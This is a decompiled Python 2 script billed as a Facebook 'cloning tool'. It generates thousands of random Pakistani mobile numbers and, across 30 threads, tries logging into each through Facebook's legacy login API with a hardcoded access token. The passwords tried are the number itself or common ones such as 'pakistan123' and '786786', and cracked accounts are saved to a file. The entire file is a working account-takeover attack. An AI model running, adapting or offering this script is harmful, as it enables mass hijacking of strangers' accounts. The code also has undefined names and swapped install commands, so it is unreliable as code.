# DECOMPILED BY HUNTERBOY ALAMIN
# FACEBOOK : MD ALAMIN KHAN
# CONTACT : https://www.facebook.com/alaminkhan.60
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(20000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
logo = '\n\x1b[1;92m\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97  \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;92m\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91  \xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\n\x1b[1;92m\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91  \xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\x1b[1;92m\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\x1b[1;93m\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91  \xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\n\x1b[1;92m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\x1b[1;93m______________________________________________________\n \n \x1b[1;93m(*)\x1b[1;92m Developer : SYED SHAWAIZ SHAH \x1b[1;33m\xf0\x9f\x94\xa5SYED-ZADA\xf0\x9f\x94\xa5\n \x1b[1;93m(*)\x1b[1;92m WhatsApp  : 03423600767\n \x1b[1;93m(*)\x1b[1;92m Tool type : Cloning Tool\n \x1b[1;93m(*)\x1b[1;92m Github    : https://github.com/syedzada1100\n\x1b[1;93m______________________________________________________\n'

def login():
    os.system('clear')
    print logo
    print '\x1b[1;92m[1] \x1b[1;93mCrack Without Login\n'
    time.sleep(0.05)
    print '\x1b[1;92m[0] \x1b[1;91mExit'
    pilih_login()


def pilih_login():
    SYED = raw_input('\n\x1b[1;92mChoose: \x1b[1;93m')
    if SYED == '':
        print '\x1b[1;91mFill In Correctly'
        pilih_login()
    elif SYED == '1':
        menu()
    elif SYED == '0':
        os.system('exit')


def menu():
    os.system('clear')
    print logo
    print '\x1b[1;92m[1]\x1b[1;93m START CRACKING..\n '
    time.sleep(0.05)
    action()


def action():
    global cpb
    global oks
    SYED = raw_input('\x1b[1;92mChoose :\x1b[1;93m')
    if SYED == '':
        print '[!] Fill In Correctly'
        action()
    elif SYED == '1':
        os.system('clear')
        print logo
        print ('    \t [\x1b[1;97m\x1b[1;41m   Choose Any Sim Number Code   \x1b[0m\x1b[1;93m]').center(50)
        print 47 * '\x1b[1;93m\xe2\x96\xac'
        print '\x1b[1;93m[*]\x1b[1;92m Jazz    : \x1b[1;92m 00,01,02,03,04,05,06,07,08'
        print '\x1b[1;93m[*]\x1b[1;92m Zong    : \x1b[1;92m 11,12,13,14,15,16,17'
        print '\x1b[1;93m[*]\x1b[1;92m Warid   : \x1b[1;92m 21,22,23,24,25'
        print '\x1b[1;93m[*]\x1b[1;92m Ufone   : \x1b[1;92m 30,31,32,33,34,35'
        print '\x1b[1;93m[*]\x1b[1;92m Telenor : \x1b[1;92m 40,41,42,43,44,45,46,47'
        print 47 * '\x1b[1;93m\xe2\x96\xac'
        try:
            c = raw_input('\x1b[1;93mChoose :\x1b[1;92m ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            blackmafiax()

    elif peak == '0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 54 * '\x1b[1;92m_'
    print ''
    xxx = str(len(id))
    jalan(' \x1b[1;93mTotal idzz number: \x1b[1;92m' + xxx)
    jalan(' \x1b[1;93mCode you choose: \x1b[1;92m' + c)
    jalan(' \x1b[1;93mPlzz wait to Crack idzz')
    jalan(' \x1b[1;92mTo Stop Process Press Ctrl+z')
    print 54 * '\x1b[1;92m_'
    print ''

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print ' \x1b[1;92m[LEGEND-SYED-OK] ' + k + c + user + ' | ' + pass1
                okb = open('Without login.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[LEGEND-SYED-CP] ' + k + c + user + ' | ' + pass1
                cps = open('Without login.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[LEGEND-SYED-OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Without login.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[LEGEND-SYED-CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Without login.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = 'pakistan123'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[LEGEND-SYED-OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Without login.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[LEGEND-SYED-CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Without login.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'pakistan'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[LEGEND-SYED-OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Without login.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[LEGEND-SYED-CP] ' + k + c + user + ' | ' + pass4
                            cps = open('Without login.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '786786'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[LEGEND-SYED-OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Without login.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[LEGEND-SYED-CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Without login.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 54 * '\x1b[1;92m_'
    print ' \x1b[1;92mThe Process has been Completed ...'
    print ' \x1b[1;92mTotal Ok/Cp : ' + str(len(oks)) + '/' + str(len(cpb))
    print ' Cloned Accounts Has Been Saved : Without Login.txt'
    print ' Note : Cp accounts Will Open after 8/10 days'
    print 54 * '\x1b[1;92m_'
    print ''
    raw_input('\x1b[1;93m Press enter to back ')
    login()


if __name__ == '__main__':
    login()
